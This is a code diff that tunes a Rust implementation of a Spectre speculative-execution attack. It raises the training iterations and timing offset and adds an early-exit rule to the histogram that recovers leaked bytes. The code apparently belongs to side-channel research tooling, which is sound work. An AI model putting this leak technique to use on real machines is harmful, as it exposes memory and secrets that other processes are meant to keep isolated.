@@ -117,7 +117,7 @@ impl Spectre {
         spectre_limit_addr: Option<*const u8>,
     ) -> Self {
         Self {
-            nb_cycles_offset: 25,
+            nb_cycles_offset: 40,
             training_func: training_func.unwrap_or(access_memory_spectre),
             target_func: target_func.unwrap_or(access_memory_spectre),
             spectre_speculation_base: spectre_speculation_base
@@ -152,11 +152,9 @@ impl Method for Spectre {
         let base_addr = BASE_ADDR;
 
         let training_op = move || {
-            for j in 0..2500 {
-                (std::mem::transmute::<usize, fn(usize, usize)>(training_func_usize))(
-                    base_addr,
-                    j % limit,
-                );
+            let fun = std::mem::transmute::<usize, fn(usize, usize)>(training_func_usize);
+            for j in 0..250_000 {
+                (fun)(base_addr, j % limit);
             }
         };
 
@@ -214,7 +212,7 @@ impl Method for Spectre {
         let (finish_lock, finish_condvar) = &*finish_pair;
         for i in 0..dest_array.len() {
             let mut histogram = [0; 256];
-            for _ in 0..NB_TIMES {
+            for iter_nb in 0..2000 {
                 // training phase
                 #[cfg(feature = "threading")]
                 {
@@ -243,8 +241,13 @@ impl Method for Spectre {
                 (self.target_func)(base_addr, target + i);
 
                 histogram[measure_byte(self).unwrap_or(0) as usize] += 1;
+                if iter_nb % 25 == 0 {
+                    if histogram[1..].iter().find(|&&x| x >= 10).is_some() {
+                        break;
+                    }
+                }
             }
-            dest_array[i] = if histogram[0] == NB_TIMES {
+            dest_array[i] = if histogram[0] == 2000 {
                 0
             } else {
                 histogram[1..]
